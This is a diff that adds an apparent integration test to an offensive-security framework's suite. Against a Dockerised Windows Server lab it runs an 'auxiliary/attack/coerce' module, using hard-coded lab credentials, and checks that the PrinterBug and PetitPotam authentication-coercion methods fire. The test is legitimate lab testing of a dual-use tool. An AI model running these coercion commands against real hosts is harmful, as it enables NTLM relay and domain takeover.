@@ -3471,5 +3471,68 @@ class TestHostPackLab(unittest.TestCase):
         self.assertIn("Microsoft Defender: RUNNING", out)
 
 
+@unittest.skipUnless(docker_available(), "docker daemon not available")
+@unittest.skipUnless(impacket_available(), "impacket not installed")
+@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
+class TestCoerceLab(unittest.TestCase):
+    """coerce against the windows lab's Server 2022: the classic methods
+    fire (petitpotam through its unpatched-variant fallback), and the
+    interfaces Server Core lacks report 'unavailable' cleanly."""
+
+    @classmethod
+    def setUpClass(cls):
+        from impacket.smbconnection import SMBConnection
+
+        cls.manager = LabManager(ROOT / "labs")
+        cls.manager.up("windows")
+        deadline = time.time() + 300
+        while time.time() < deadline:
+            try:
+                conn = SMBConnection(HOST, HOST, sess_port=1445, timeout=5)
+                conn.login("labadmin", "Labpass2024!")
+                conn.close()
+                break
+            except Exception:
+                time.sleep(5)
+        else:
+            cls.manager.down("windows")
+            raise RuntimeError("windows lab SMB not up within 300s")
+
+    @classmethod
+    def tearDownClass(cls):
+        cls.manager.down("windows")
+
+    def test_methods_report_verdicts(self):
+        registry = ModuleRegistry(ROOT / "modules")
+        registry.load()
+        console = FrameworkConsole(registry, Store(":memory:"))
+        try:
+            buf = io.StringIO()
+            with contextlib.redirect_stdout(buf):
+                for command in (
+                    "use auxiliary/attack/coerce",
+                    f"set RHOSTS {HOST}",
+                    "set RPORT 1445",
+                    "set DOMAIN .",
+                    "set USERNAME labadmin",
+                    "set PASSWORD Labpass2024!",
+                    # slirp's host gateway: refuses fast (RST), so fired
+                    # methods return at wire speed instead of hanging on
+                    # a NetBIOS timeout
+                    "set LISTENER 10.0.2.2",
+                    "run",
+                ):
+                    console.onecmd(command)
+            out = buf.getvalue()
+            self.assertNotIn("Traceback", out)
+            self.assertIn("printerbug: FIRED", out)
+            self.assertIn("petitpotam: FIRED", out)
+            # DFS-N and FSRVP are server-role interfaces — absent on Core
+            self.assertIn("dfscoerce: unavailable", out)
+            self.assertIn("shadowcoerce: unavailable", out)
+        finally:
+            console.store.close()
+
+
 if __name__ == "__main__":
     unittest.main()
